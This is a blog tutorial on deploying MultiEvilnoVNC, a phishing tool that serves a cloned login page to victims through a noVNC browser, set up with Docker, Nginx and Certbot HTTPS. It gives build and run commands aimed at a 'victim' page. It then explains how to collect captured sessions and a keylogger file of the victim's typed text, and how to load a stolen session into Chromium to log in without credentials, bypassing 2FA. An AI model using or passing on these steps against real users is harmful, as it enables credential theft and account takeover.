---
title: Setting Up MultiEvilnoVNC with HTTPS
description: This guide provides detailed instructions for setting up MultiEvilNoVNC, including preparing Docker containers, configuring Nginx, obtaining SSL certificates with Certbot, and modifying the startup script to ensure proper functionality. Additionally, it covers how to run the tool and manage and view sessions of websites visited by users.
snippetone: Tools
category: Tools
SEOTitle: MultiEvilnoVNC
lang: es
date: 2024-07-18
---



![Application Logo](/static/blog/img/MultiEvilnoVNC.png)

### Introduction

In this guide, we are going to configure a tool called [MultiEvilNoVNC](https://github.com/wanetty/MultiEvilnoVNC). This tutorial will cover configuring Nginx, obtaining SSL certificates with Certbot, preparing Docker containers, and modifying the startup script to ensure proper functionality.

### Requirements

Before you begin, make sure you have the following:

1. A test domain (e.g. `testdomain.com`).
2. Docker installed on your system.
3. Certbot installed for obtaining SSL certificates.


### Step 1: Preparing the Docker Containers

First, you must mount the Docker containers. This can be done in two ways:

#### Automatic Method:

```bash
git clone https://github.com/wanetty/MultiEvilnoVNC.git
cd EvilnoVNC
make build
```

#### Manual method:

```bash
git clone https://github.com/wanetty/MultiEvilnoVNC.git
cd EvilnoVNC
sudo chown -R 103 Downloads
sudo docker build -f evilnovnc.Dockerfile -t evilnovnc .
sudo docker build -f nginx.Dockerfile -t evilnginx .
```


### Step 2: Configuring Nginx for HTTPS

Next, configure Nginx to handle HTTP and HTTPS requests. Create a configuration file in `Files/default.conf` with the following content:

```nginx
server {
    listen       80;
    listen  [::]:80;
    server_name  testdomain.com;

    # Redirección de HTTP a HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen       443 ssl http2;
    listen  [::]:443 ssl http2;
    server_name  testdomain.com;

    ssl_certificate /certs/fullchain.pem;
    ssl_certificate_key /certs/privkey.pem;

    # SSL settings
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH';
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;

    access_log  /var/log/nginx/testdomain.access.log;
    error_log   /var/log/nginx/testdomain.error.log;

    location / {
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    }

    location /reso {
        proxy_pass   http://127.0.0.1:8080;
    }
}
```

### Step 3: Obtaining SSL Certificates

To secure HTTPS communication, you need to obtain SSL certificates. We will use Certbot for this purpose. Run the following command:

```bash
sudo certbot certonly --standalone --preferred-challenges http -d testdomain.com
```
![Certificate files](/static/blog/img/multivnc_cert1.png)

> **Warning:** You can obtain the certificates in another way if you prefer.

### Step 4: Modifying the Startup Script

The startup script `start_auto.sh` needs to be modified to configure Docker and copy the certificates to the correct location. Below is an extract of the script with the modifications indicated in the image provided:

![Modifications of start_auto.sh](/static/blog/img/multivnc_startauto.png)


### Step 5: Execute the tool

Finally, run the tool using the following command:

```bash
./start_auto.sh https://clone.victim.page.com
```

### After the execution

In the `Downloads` folder, you will find the sessions of the websites that have been visited by users. These sessions are identified by the same identifier as the website. In addition, within each session, there is a file called `keylogger` which contains the text written by the victim.

If you want to open the sessions in a browser, you can do so by copying the content of one of the sessions to your Chromium configuration as follows (replace `SESSION_ID` with the identifier of the session you want to open):

```bash
cp -R Downloads/SESSION_ID ~/.config/chromium/
```

Then, run Chromium with the following command:

```bash
/bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &
```
After that, open Chromium and navigate to the victim's website. You should be able to log in without needing to enter a username and password.

### Other related sites.

* [Darkbyte Blog](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)

* [Inspiration for multisessions](https://datawookie.dev/blog/2021/08/websockify-novnc-behind-an-nginx-proxy/)

* [Official guide to nginx via https](https://nginx.org/en/docs/http/configuring_https_servers.html)

